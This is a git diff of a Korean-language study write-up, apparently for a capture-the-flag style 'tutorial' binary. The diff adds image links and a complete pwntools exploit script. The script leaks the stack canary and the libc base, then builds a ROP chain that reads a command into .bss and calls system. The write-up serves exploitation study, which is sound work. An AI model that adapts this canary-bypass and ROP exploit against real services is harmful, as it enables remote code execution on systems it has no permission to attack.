@@ -11,15 +11,15 @@ user add를 이용하여 tutorial 계정을 만들어 주어야합니다.
 
 tutorial에 접속하면, 아래 그림과 같이 3가지 선택지가 나옵니다.
 
-![Alt text]()
+![Alt text](https://github.com/Funniest/System-study/blob/master/tutorial/img/Main.PNG)
 
 여기서 1번 메뉴는 아래와 같이 puts의 주소를 뿌려줍니다. ㄱㅇㄷ
 
-![Alt text]()
+![Alt text](https://github.com/Funniest/System-study/blob/master/tutorial/img/Func1.PNG)
 
 2번 메뉴는 오버플로우가 일어나는 선택지 입니다.
 
-![Alt text]()
+![Alt text](https://github.com/Funniest/System-study/blob/master/tutorial/img/Func2.PNG)
 
 sub rsp, 150 -> 0x150만큼 버퍼 생성
 
@@ -67,7 +67,7 @@ sub rsp, 150 -> 0x150만큼 버퍼 생성
 ```
 
 ### Gadget 잘라쓰기
-![Alt text]()
+![Alt text](https://github.com/Funniest/System-study/blob/master/tutorial/img/gadget.PNG)
 
 만약 위 처럼 pop x 7 ret이 있다고 해서 필요한 가젯이 ppr이면 아래 그냥 ppr만 때어 썻는데,
 
@@ -113,6 +113,7 @@ libc파일의 가젯들을 사용할 수 있다는 사실을 오늘 처음 알�
 ```
 
 ***※하루 동안 고생한 부분이 있었는데, puts got를 뿌릴때 -1280을 해서 뿌려서 +1280을 해줘야합니다.***
+
 ***※문제에서 libc 2.19를 주는데 풀이 환경에 따라 다릅니다. (아래 명령어를 이용해서 확인)***
 ```
 cat /proc/process nubmer/maps를 하면 로컬에서 어떤 libc쓰는지 보이더라구요!
@@ -122,6 +123,92 @@ cat /proc/process nubmer/maps를 하면 로컬에서 어떤 libc쓰는지 보이
 ### 소스코드
 Ubuntu 16 LTS 64 bit환경에서 테스팅 하였습니다.
 ```
+from pwn import *
+
+r = remote('127.0.0.1', 9977)
+elf = ELF('./tutorial')
+libc = ELF('./libc-2.23.so')
+
+#get Canary!
+print r.recvuntil(">")
+r.sendline("2")
+print r.recvuntil(">")
+
+payload = "A" * 311
+
+r.sendline(payload)
+print r.recvuntil('\n')
+canary = u64(r.recv(8))
+print "canary : " + str(canary)
+
+#exploit!
+#using objdump -h and -d
+read_plt = elf.plt['read']
+write_plt = elf.plt['write']
+bss = elf.bss()
+
+print "read : " + hex(read_plt)
+print "write : " + hex(write_plt)
+
+#get pop gadget in rop online!
+poprdi = 0x21102
+poprsi = 0x202e8
+poprdx = 0x1144b6
+
+cmd = "ls -al"
+
+libc_puts = libc.symbols['puts'] #objdump -d libc-2.19.so | grep puts
+libc_system = libc.symbols['system'] #objdump -d libc-2.19.so | grep puts
+
+#get libc base (puts_got - libc_puts = libc base)
+print r.recvuntil(">")
+r.sendline("1")
+print r.recvuntil("Reference:")
+
+puts_got = int(r.recv(14), 16)+1280
+print "puts got : " + hex(puts_got)
+print "libc puts : " + hex(libc_puts)
+
+libc_base = puts_got - libc_puts
+
+#offset calc
+poprdi = libc_base + poprdi
+poprsi = libc_base + poprsi
+poprdx = libc_base + poprdx
+
+system = libc_base + libc_system
+print "system : " + hex(system)
+
+#send payload
+print r.recvuntil(">")
+r.sendline("2")
+print r.recvuntil(">")
+
+payload = "A" * 312
+payload += p64(canary)
+payload += p64(0x4141414141414141)
+
+payload += p64(poprdi)
+payload += p64(0x04)
+payload += p64(poprsi)
+payload += p64(bss)
+payload += p64(poprdx)
+payload += p64(len(cmd))
+payload += p64(read_plt)
+
+payload += p64(poprdi)
+payload += p64(bss)
+payload += p64(system)
+
+r.send(payload)
+print "== payload =="
+print payload.encode('hex')
+
+print "== echo =="
+print r.recv(2048).encode('hex')
+r.send(cmd)
+
+print "=- END -="
+
+#r.interactive()
 ```
-
-
